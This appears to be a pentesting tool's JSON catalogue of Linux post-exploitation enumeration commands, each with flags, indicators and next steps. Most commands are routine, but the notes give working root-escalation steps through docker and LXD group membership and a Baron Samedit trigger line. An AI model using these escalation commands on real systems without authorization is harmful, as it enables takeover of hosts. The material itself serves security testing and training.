{
  "category": "post-exploit",
  "subcategory": "enumeration",
  "description": "Basic Linux enumeration commands for situational awareness after initial foothold",
  "commands": [
    {
      "id": "linux-id",
      "name": "Display User Identity",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "id",
      "description": "Display current user's UID, GID, and group memberships - first command after gaining shell",
      "variables": [],
      "flag_explanations": {
        "(no flags)": "Display full identity info - uid=X(name) gid=X(name) groups=X(name),Y(name)...",
        "-u": "Print only effective user ID (number)",
        "-g": "Print only effective group ID (number)",
        "-G": "Print all group IDs (numbers)",
        "-n": "Print name instead of number (requires -u, -g, or -G)"
      },
      "tags": [
        "ENUMERATION",
        "LINUX",
        "POST_EXPLOITATION",
        "QUICK_WIN",
        "USER_DISCOVERY"
      ],
      "success_indicators": [
        "uid=",
        "gid=",
        "groups=",
        "sudo group membership",
        "docker group membership",
        "lxd group membership"
      ],
      "failure_indicators": [
        "id: command not found (extremely rare)"
      ],
      "prerequisites": [],
      "next_steps": [
        "linux-whoami",
        "linux-hostname",
        "linux-sudo-list"
      ],
      "alternatives": [
        "linux-whoami"
      ],
      "troubleshooting": {
        "Command not found": "Use 'whoami' as fallback or check /usr/bin/id"
      },
      "notes": "FIRST command after gaining shell access. Determines privilege level immediately.\n\nCritical group memberships to look for:\n- sudo/wheel = potential root access\n- docker = container escape to root\n- lxd = LXD container escape to root\n- adm = can read logs (credential hunting)\n- disk = raw disk access\n\nTime estimate: 1 second.\n\npractical tip: If uid=0, you're already root. If in sudo/docker/lxd group, privesc is trivial.",
      "methodology_guidance": {
        "after_success": "Check for privileged groups (sudo, docker, lxd). If in docker group, immediate root via container escape."
      }
    },
    {
      "id": "linux-whoami",
      "name": "Display Current Username",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "whoami",
      "description": "Display effective username of current user - simpler alternative to id",
      "variables": [],
      "flag_explanations": {
        "(no flags)": "Print effective username only"
      },
      "tags": [
        "ENUMERATION",
        "LINUX",
        "POST_EXPLOITATION",
        "QUICK_WIN"
      ],
      "success_indicators": [
        "root",
        "www-data",
        "username displayed"
      ],
      "failure_indicators": [
        "whoami: command not found"
      ],
      "prerequisites": [],
      "next_steps": [
        "linux-id",
        "linux-hostname"
      ],
      "alternatives": [
        "linux-id"
      ],
      "troubleshooting": {
        "Command not found": "Use 'id -un' or 'echo $USER' as alternatives"
      },
      "notes": "Quick username check. Use 'id' for full group membership info.\n\nCommon pentest initial users:\n- www-data (web exploit)\n- apache (web exploit)\n- mysql (database exploit)\n- nobody (limited access)\n\nTime estimate: 1 second.",
      "methodology_guidance": {
        "after_success": "Immediately run 'id' for group membership info"
      }
    },
    {
      "id": "linux-hostname",
      "name": "Display System Hostname",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "hostname",
      "description": "Display system hostname - useful for identifying machine role and environment",
      "variables": [],
      "flag_explanations": {
        "(no flags)": "Display hostname",
        "-f": "Display fully qualified domain name (FQDN)",
        "-i": "Display IP address of hostname",
        "-I": "Display all IP addresses for the host"
      },
      "tags": [
        "ENUMERATION",
        "LINUX",
        "POST_EXPLOITATION"
      ],
      "success_indicators": [
        "Hostname displayed",
        "Domain name revealed",
        "Server role indicated (e.g., web01, db01, dc01)"
      ],
      "failure_indicators": [
        "hostname: command not found"
      ],
      "prerequisites": [],
      "next_steps": [
        "linux-uname",
        "ip-addr"
      ],
      "alternatives": [
        "cat /etc/hostname"
      ],
      "troubleshooting": {
        "Command not found": "Try 'cat /etc/hostname' or 'uname -n'"
      },
      "notes": "Hostname often reveals machine purpose:\n- web01, www = web server\n- db01, mysql = database server\n- dc01, ad = domain controller\n- dev, staging, prod = environment\n\nTime estimate: 1 second.\n\npractical tip: In AD environments, hostname helps identify domain membership.",
      "methodology_guidance": {
        "after_success": "Note hostname for documentation. Look for naming patterns indicating machine roles."
      }
    },
    {
      "id": "linux-uname",
      "name": "Display System Information",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "uname -a",
      "description": "Display kernel version, architecture, and OS info - critical for kernel exploit research",
      "variables": [],
      "flag_explanations": {
        "-a": "All information - kernel name, hostname, kernel release, kernel version, machine hardware, OS",
        "-s": "Kernel name (e.g., Linux)",
        "-r": "Kernel release version (e.g., 5.4.0-42-generic)",
        "-m": "Machine hardware name (e.g., x86_64)",
        "-p": "Processor type"
      },
      "tags": [
        "ENUMERATION",
        "EXPLOITATION",
        "LINUX",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION"
      ],
      "success_indicators": [
        "Kernel version displayed",
        "Old kernel (< 4.x)",
        "Known vulnerable version",
        "x86_64 architecture"
      ],
      "failure_indicators": [
        "uname: command not found"
      ],
      "prerequisites": [],
      "next_steps": [
        "linux-os-release",
        "linux-kernel-version",
        "searchsploit"
      ],
      "alternatives": [
        "linux-kernel-version",
        "cat /proc/version"
      ],
      "troubleshooting": {
        "Command not found": "Use 'cat /proc/version' as alternative"
      },
      "notes": "Kernel version determines exploit compatibility.\n\nCommon vulnerable kernels:\n- < 3.x: Many local root exploits\n- 4.4.0-x: Ubuntu 16.04 exploits\n- DirtyCOW (CVE-2016-5195): Linux < 4.8.3\n- Baron Samedit (CVE-2021-3156): sudo < 1.9.5p2\n\nTime estimate: 1 second.\n\npractical tip: Search 'searchsploit linux kernel X.Y' for exploits.\n\nArchitecture matters: compile exploits for correct arch (x86 vs x86_64).",
      "methodology_guidance": {
        "after_success": "Search kernel version on exploit-db and searchsploit. Match exact version for reliability."
      }
    },
    {
      "id": "linux-os-release",
      "name": "Display OS Distribution Info",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "cat /etc/os-release",
      "description": "Display Linux distribution name, version, and codename - useful for distro-specific exploits",
      "variables": [],
      "flag_explanations": {
        "/etc/os-release": "Standard file containing OS identification data on systemd-based systems"
      },
      "tags": [
        "ENUMERATION",
        "LINUX",
        "POST_EXPLOITATION"
      ],
      "success_indicators": [
        "NAME=",
        "VERSION=",
        "Ubuntu",
        "Debian",
        "CentOS",
        "VERSION_ID="
      ],
      "failure_indicators": [
        "No such file or directory",
        "Permission denied"
      ],
      "prerequisites": [],
      "next_steps": [
        "linux-uname",
        "linux-kernel-version"
      ],
      "alternatives": [
        "cat /etc/issue",
        "cat /etc/*release",
        "lsb_release -a"
      ],
      "troubleshooting": {
        "File not found": "Try: cat /etc/issue, cat /etc/*release, or lsb_release -a",
        "Non-systemd system": "Use cat /etc/issue or /etc/redhat-release"
      },
      "notes": "Distro version determines package versions and available exploits.\n\nCommon distros:\n- Ubuntu 16.04 (Xenial): Many local exploits\n- Ubuntu 18.04 (Bionic): Fewer exploits, check sudo version\n- Debian 9/10: Stable, fewer exploits\n- CentOS 7: Check for RHEL exploits\n\nTime estimate: 1 second.\n\npractical tip: VERSION_ID helps find distro-specific exploits on exploit-db.",
      "methodology_guidance": {
        "after_success": "Search distro + version on exploit-db. Check default package versions."
      }
    },
    {
      "id": "linux-container-check",
      "name": "Check if Running in Container",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "cat /proc/1/cgroup 2>/dev/null | grep -i docker; ls -la /.dockerenv 2>/dev/null; cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -i container",
      "description": "Detect if running inside Docker, LXC, or other container environment",
      "variables": [],
      "flag_explanations": {
        "/proc/1/cgroup": "Cgroup info for PID 1 - contains 'docker' if containerized",
        "/.dockerenv": "File exists in Docker containers",
        "/proc/1/environ": "Environment variables of init process - may contain container indicators"
      },
      "tags": [
        "CONTAINER",
        "DISCOVERY",
        "DOCKER",
        "ENUMERATION",
        "LINUX",
        "POST_EXPLOITATION"
      ],
      "success_indicators": [
        "/docker/ in cgroup output",
        "/.dockerenv exists",
        "container=docker",
        "lxc in cgroup"
      ],
      "failure_indicators": [
        "No docker/lxc strings found",
        "Permission denied"
      ],
      "prerequisites": [],
      "next_steps": [
        "linux-docker-escape"
      ],
      "alternatives": [],
      "troubleshooting": {
        "Permission denied": "May still indicate container - check other indicators",
        "Empty output": "Likely on bare metal, not containerized"
      },
      "notes": "Container detection matters because:\n- Network may be isolated\n- Filesystem is restricted\n- Container escape may be needed for full access\n- Host exploitation requires escape\n\nContainer escape vectors:\n- Mounted docker socket (/var/run/docker.sock)\n- Privileged container (--privileged)\n- Capabilities (CAP_SYS_ADMIN)\n\nTime estimate: 2 seconds.\n\npractical tip: If in container, look for docker socket mount or misconfigurations.",
      "methodology_guidance": {
        "after_success": "Check for docker socket mount, privileged mode, or capabilities for container escape"
      }
    },
    {
      "id": "linux-cat-group",
      "name": "Enumerate Security-Relevant Groups",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "cat /etc/group | grep -E 'sudo|admin|wheel|docker|lxd|disk|adm|shadow'",
      "description": "Display security-relevant groups and their members - identifies privilege escalation targets",
      "variables": [],
      "flag_explanations": {
        "/etc/group": "File containing group definitions (name:password:GID:members)",
        "-E": "Extended regex for multiple patterns",
        "sudo|admin|wheel": "Groups with potential root access",
        "docker|lxd": "Groups with container access (root equivalent)",
        "disk|adm|shadow": "Groups with sensitive file access"
      },
      "tags": [
        "ENUMERATION",
        "LINUX",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "USER_DISCOVERY"
      ],
      "success_indicators": [
        "sudo:x:27:username",
        "docker:x:998:username",
        "lxd:x:999:username",
        "Users listed in privileged groups"
      ],
      "failure_indicators": [
        "Permission denied",
        "File not found"
      ],
      "prerequisites": [],
      "next_steps": [
        "linux-docker-group",
        "linux-lxd-group",
        "linux-sudo-list"
      ],
      "alternatives": [
        "getent group sudo",
        "groups"
      ],
      "troubleshooting": {
        "No output": "Groups may be named differently - try: cat /etc/group | grep -v 'nologin'",
        "Permission denied": "Unusual - /etc/group should be world-readable"
      },
      "notes": "Group meanings:\n- sudo/admin/wheel: Can run commands as root\n- docker: Container access = root on host\n- lxd: LXD container escape = root\n- disk: Raw disk access = read any file\n- adm: Can read /var/log (credential hunting)\n- shadow: Can read /etc/shadow (password hashes)\n\nTime estimate: 1 second.\n\npractical tip: If ANY user is in docker/lxd, finding their creds = root.",
      "methodology_guidance": {
        "after_success": "Note users in privileged groups. Their credentials are high-value targets."
      }
    },
    {
      "id": "linux-cat-passwd",
      "name": "Display All User Accounts",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "cat /etc/passwd",
      "description": "Display all user accounts - identifies potential targets for credential attacks",
      "variables": [],
      "flag_explanations": {
        "/etc/passwd": "User account database (username:x:UID:GID:comment:home:shell)"
      },
      "tags": [
        "ENUMERATION",
        "LINUX",
        "POST_EXPLOITATION",
        "USER_DISCOVERY"
      ],
      "success_indicators": [
        "User accounts listed",
        "Users with /bin/bash shell",
        "UIDs >= 1000 (human users)",
        "Service accounts identified"
      ],
      "failure_indicators": [
        "Permission denied (extremely rare)"
      ],
      "prerequisites": [],
      "next_steps": [
        "linux-enum-users-shells",
        "linux-check-shadow-readable"
      ],
      "alternatives": [
        "getent passwd"
      ],
      "troubleshooting": {
        "Too many accounts": "Filter with: cat /etc/passwd | grep -v nologin | grep bash"
      },
      "notes": "Format: username:x:UID:GID:comment:home:shell\n\nImportant observations:\n- UID 0 = root (multiple accounts can have UID 0!)\n- UID 1000+ = human users\n- Shell = /bin/bash or /bin/sh = interactive login\n- Shell = /usr/sbin/nologin = service account\n\nTime estimate: 1 second.\n\npractical tip: Check for UID 0 accounts other than root - backdoor indicator.\nCheck for password hashes in x field (very old systems).",
      "methodology_guidance": {
        "after_success": "Identify users with shells for credential attacks. Check home directories."
      }
    },
    {
      "id": "linux-last-login",
      "name": "Display User Login History",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "lastlog 2>/dev/null | grep -v 'Never'",
      "description": "Show last login times for users - identifies active accounts and access patterns",
      "variables": [],
      "flag_explanations": {
        "lastlog": "Display last login info from /var/log/lastlog",
        "grep -v 'Never'": "Exclude accounts that have never logged in"
      },
      "tags": [
        "ENUMERATION",
        "LINUX",
        "POST_EXPLOITATION",
        "USER_DISCOVERY"
      ],
      "success_indicators": [
        "Recent login dates shown",
        "Active user accounts identified",
        "Login sources revealed (pts/X, tty, IP)"
      ],
      "failure_indicators": [
        "lastlog: command not found",
        "Permission denied"
      ],
      "prerequisites": [],
      "next_steps": [
        "linux-auth-logs",
        "linux-bash-history"
      ],
      "alternatives": [
        "last",
        "who",
        "w"
      ],
      "troubleshooting": {
        "Command not found": "Use 'last' or 'who' as alternatives",
        "Empty output": "All accounts may have 'Never' logged in - try 'last' instead"
      },
      "notes": "Login info reveals:\n- pts/X = SSH or terminal login\n- tty = console login\n- IP address = remote access source\n- Recent dates = active accounts\n\nAlternatives:\n- last: Recent logins from wtmp\n- who: Currently logged in users\n- w: Currently logged in + activity\n\nTime estimate: 1 second.\n\npractical tip: Recent activity indicates password might be simple/memorable.",
      "methodology_guidance": {
        "after_success": "Focus credential attacks on recently active users"
      }
    },
    {
      "id": "linux-sudo-version",
      "name": "Check Sudo Version for CVEs",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "sudo --version",
      "description": "Display sudo version - check for known vulnerabilities like Baron Samedit (CVE-2021-3156)",
      "variables": [],
      "flag_explanations": {
        "--version": "Display sudo version information"
      },
      "tags": [
        "CVE",
        "ENUMERATION",
        "EXPLOITATION",
        "LINUX",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN"
      ],
      "success_indicators": [
        "Sudo version < 1.9.5p2 (Baron Samedit)",
        "Sudo version < 1.8.28 (CVE-2019-14287)",
        "Old sudo version displayed"
      ],
      "failure_indicators": [
        "sudo: command not found",
        "Latest patched version"
      ],
      "prerequisites": [],
      "next_steps": [
        "linux-sudo-list",
        "searchsploit"
      ],
      "alternatives": [
        "dpkg -l sudo",
        "rpm -qa sudo"
      ],
      "troubleshooting": {
        "Command not found": "sudo may not be installed - check 'which sudo' or 'dpkg -l | grep sudo'"
      },
      "notes": "Known sudo CVEs:\n\nCVE-2021-3156 (Baron Samedit):\n- Versions: 1.8.2 to 1.8.31p2, 1.9.0 to 1.9.5p1\n- Heap overflow, local root\n- Exploit: sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')\n\nCVE-2019-14287:\n- Versions: < 1.8.28\n- sudo -u#-1 bypass\n- Requires specific sudoers config\n\nTime estimate: 1 second.\n\npractical tip: Baron Samedit is common in older pentest machines.",
      "methodology_guidance": {
        "after_success": "If vulnerable version, search for exploit on exploit-db or GitHub"
      }
    },
    {
      "id": "linux-docker-group",
      "name": "Check Docker Group Membership",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "id | grep -i docker && docker ps 2>/dev/null",
      "description": "Check if current user is in docker group - instant root if so",
      "variables": [],
      "flag_explanations": {
        "id": "Display user groups",
        "grep -i docker": "Check for docker group membership",
        "docker ps": "Test docker access"
      },
      "tags": [
        "CONTAINER",
        "DOCKER",
        "ENUMERATION",
        "EXPLOITATION",
        "LINUX",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN"
      ],
      "success_indicators": [
        "docker) in id output",
        "Docker containers listed",
        "Docker daemon accessible"
      ],
      "failure_indicators": [
        "No docker group",
        "Permission denied",
        "docker: command not found"
      ],
      "prerequisites": [],
      "next_steps": [
        "linux-docker-escape"
      ],
      "alternatives": [
        "groups | grep docker"
      ],
      "troubleshooting": {
        "docker: command not found": "Docker may not be installed",
        "Permission denied": "Not in docker group - expected on most systems"
      },
      "notes": "Docker group membership = ROOT EQUIVALENT.\n\nExploit:\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\nThis mounts host root filesystem and gives shell as root.\n\nTime estimate: 2 seconds.\n\npractical tip: Docker group is INSTANT root. Always check early in enumeration.",
      "methodology_guidance": {
        "after_success": "Immediately escalate with docker container mounting host filesystem"
      }
    },
    {
      "id": "linux-lxd-group",
      "name": "Check LXD Group Membership",
      "category": "post-exploit",
      "subcategory": "enumeration",
      "command": "id | grep -i lxd && lxc list 2>/dev/null",
      "description": "Check if current user is in lxd group - can escalate to root via container",
      "variables": [],
      "flag_explanations": {
        "id": "Display user groups",
        "grep -i lxd": "Check for lxd group membership",
        "lxc list": "Test LXD access"
      },
      "tags": [
        "CONTAINER",
        "ENUMERATION",
        "EXPLOITATION",
        "LINUX",
        "LXD",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN"
      ],
      "success_indicators": [
        "lxd) in id output",
        "LXD containers listed",
        "LXD daemon accessible"
      ],
      "failure_indicators": [
        "No lxd group",
        "Permission denied",
        "lxc: command not found"
      ],
      "prerequisites": [],
      "next_steps": [],
      "alternatives": [
        "groups | grep lxd"
      ],
      "troubleshooting": {
        "lxc: command not found": "LXD may not be installed",
        "Permission denied": "Not in lxd group - expected on most systems"
      },
      "notes": "LXD group membership = ROOT EQUIVALENT.\n\nExploit requires building/importing image then mounting host filesystem.\n\nSteps:\n1. Import Alpine image or build from distrobuilder\n2. lxc init alpine privesc -c security.privileged=true\n3. lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true\n4. lxc start privesc\n5. lxc exec privesc /bin/sh\n6. cd /mnt/root (host root filesystem)\n\nTime estimate: 2 seconds for check, 2-3 minutes for exploit.\n\npractical tip: LXD group is INSTANT root but requires more steps than docker.",
      "methodology_guidance": {
        "after_success": "Import container image and mount host filesystem for root access"
      }
    }
  ]
}